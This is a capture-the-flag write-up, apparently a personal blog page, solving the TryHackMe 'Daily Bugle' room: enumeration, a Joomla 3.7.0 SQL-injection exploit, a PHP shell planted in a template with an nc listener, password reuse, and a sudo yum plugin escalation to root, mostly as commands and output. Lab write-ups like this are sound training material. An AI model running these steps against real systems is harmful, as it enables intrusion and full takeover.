@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+<script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=65103d22637e200019cd3518&product=sticky-share-buttons&source=platform" async="async"></script>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Daily Bugle | tudor.mindra</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Daily Bugle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="THM - Daily Bugle" />
+<meta property="og:description" content="THM - Daily Bugle" />
+<link rel="canonical" href="https://tudm99.github.io/dbugle.html" />
+<meta property="og:url" content="https://tudm99.github.io/dbugle.html" />
+<meta property="og:site_name" content="tudor.mindra" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Daily Bugle" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"THM - Daily Bugle","headline":"Daily Bugle","url":"https://tudm99.github.io/dbugle.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=66fea1825500f714ba0fda421979ff6a6d9ddf2a">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Daily Bugle</h1>
+      <h2 class="project-tagline">THM - Daily Bugle</h2>
+      
+      
+    </header>
+<div class="sharethis-sticky-share-buttons"></div>
+    <main id="content" class="main-content" role="main">
+      <h2 id="enumeration">Enumeration</h2>
+
+<p>Nmap Scan:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.8.229
+Host is up (0.067s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   MariaDB (unauthorized)
+</code></pre></div></div>
+<p>Gobuster Scan:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/images               (Status: 301) [Size: 234] [--&gt; http://10.10.8.229/images/]
+/media                (Status: 301) [Size: 233] [--&gt; http://10.10.8.229/media/]
+/templates            (Status: 301) [Size: 237] [--&gt; http://10.10.8.229/templates/]
+/modules              (Status: 301) [Size: 235] [--&gt; http://10.10.8.229/modules/]
+/bin                  (Status: 301) [Size: 231] [--&gt; http://10.10.8.229/bin/]
+/plugins              (Status: 301) [Size: 235] [--&gt; http://10.10.8.229/plugins/]
+/includes             (Status: 301) [Size: 236] [--&gt; http://10.10.8.229/includes/]
+/language             (Status: 301) [Size: 236] [--&gt; http://10.10.8.229/language/]
+/components           (Status: 301) [Size: 238] [--&gt; http://10.10.8.229/components/]
+/cache                (Status: 301) [Size: 233] [--&gt; http://10.10.8.229/cache/]
+/libraries            (Status: 301) [Size: 237] [--&gt; http://10.10.8.229/libraries/]
+/tmp                  (Status: 301) [Size: 231] [--&gt; http://10.10.8.229/tmp/]
+/layouts              (Status: 301) [Size: 235] [--&gt; http://10.10.8.229/layouts/]
+/administrator
+</code></pre></div></div>
+<p>Looking at the source we can see the website is running Joomla CMS</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script type="application/json" class="joomla-script-options new"&gt;{"system.keepalive":{"interval":840000,"uri":"\/index.php\/component\/ajax\/?format=json"}}&lt;/script&gt;
+</code></pre></div></div>
+<p>Robots.txt file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent: *
+Disallow: /administrator/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+</code></pre></div></div>
+<p>Accessing:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.8.229/language/en-GB/en-GB.xml
+</code></pre></div></div>
+<p>Shows us that the Joomla version is 3.7.0</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;metafile version="3.7" client="site"&gt;
+&lt;name&gt;English (en-GB)&lt;/name&gt;
+&lt;version&gt;3.7.0&lt;/version&gt;
+</code></pre></div></div>
+<p>Looking around for an exploit, it appears we have found one using searchsploit, and another one on github, “Joomblah”</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/XiphosResearch/exploits/tree/master/Joomblah
+
+[-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '[REDACTED]', '', '']
+  -  Extracting sessions from fb9j5_session
+</code></pre></div></div>
+<p>So we found a user, jonah, and a hash. Cracking the hash gave us a password.</p>
+
+<p>Let’s try logging into joomla.</p>
+
+<p>It worked!</p>
+
+<p>We’ll now go to “templates” and replace the “index.php” content with a php shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 9002
+Listening on 0.0.0.0 9002
+Connection received on 10.10.8.229 37676
+SOCKET: Shell has connected! PID: 3568
+whoami
+apache
+</code></pre></div></div>
+<p>From here, I’ll beautify my shell and look around for interesting files.</p>
+
+<p>Also, I’ll run linpeas. Just open two shells.</p>
+
+<p>Now, this server is vulnerable to “PwnKit”. But I don’t think it’s the intended path, so we’re not gonna use it.</p>
+
+<p>After looking up and down and finding nothing, I went back to the web directory, where a “configuration.php” file was sitting.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$host = 'localhost';
+        public $user = 'root';
+        public $password = '[REDACTED]';
+        public $db = 'joomla';
+        public $dbprefix = 'fb9j5_';
+        public $live_site = '';
+
+bash-4.2$ su root
+su root
+Password: [REDACTED]
+
+su: Authentication failure
+
+bash-4.2$ su jjameson
+su jjameson
+Password: [REDACTED]
+
+[jjameson@dailybugle html]$ 
+</code></pre></div></div>
+<p>Great! We moved laterally to jjameson.</p>
+
+<p>Let’s see his level of access. But first, I’ll ssh into the machine for a better shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh jjameson@10.10.8.229
+jjameson@10.10.8.229's password: 
+Last login: Sun Sep 24 15:19:41 2023
+[jjameson@dailybugle ~]$ ls
+user.txt
+[jjameson@dailybugle ~]$   
+</code></pre></div></div>
+<p>We now have the user.txt file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[jjameson@dailybugle ~]$ sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME
+    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+[jjameson@dailybugle ~]$ 
+
+</code></pre></div></div>
+<p>Using yum with sudo, we can look on GTFOBins and gain root.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[jjameson@dailybugle ~]$ TF=$(mktemp -d)
+[jjameson@dailybugle ~]$ cat &gt;$TF/x&lt;&lt;EOF
+&gt; [main]
+&gt; plugins=1
+&gt; pluginpath=$TF
+&gt; pluginconfpath=$TF
+&gt; EOF
+[jjameson@dailybugle ~]$ cat &gt;$TF/y.conf&lt;&lt;EOF
+&gt; [main]
+&gt; enabled=1
+&gt; EOF
+[jjameson@dailybugle ~]$ cat &gt;$TF/y.py&lt;&lt;EOF
+&gt; import os
+&gt; import yum
+&gt; from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+&gt; requires_api_version='2.1'
+&gt; def init_hook(conduit):
+&gt;   os.execl('/bin/sh','/bin/sh')
+&gt; EOF
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+Failed to set locale, defaulting to C
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.2# 
+</code></pre></div></div>
+<p>We now have root access, we can read the flag and submit it!</p>
+
+<p>Good hunting o7</p>
+
+<p><a href="https://tryhackme.com/room/dailybugle">Try it out yourself!</a></p>
+
+     <p><a href="./"><h2 id="goback">Go back</h2></a></p>
+
+      <footer class="site-footer">
+       
+      </footer>
+    </main>
+  </body>
+</html>
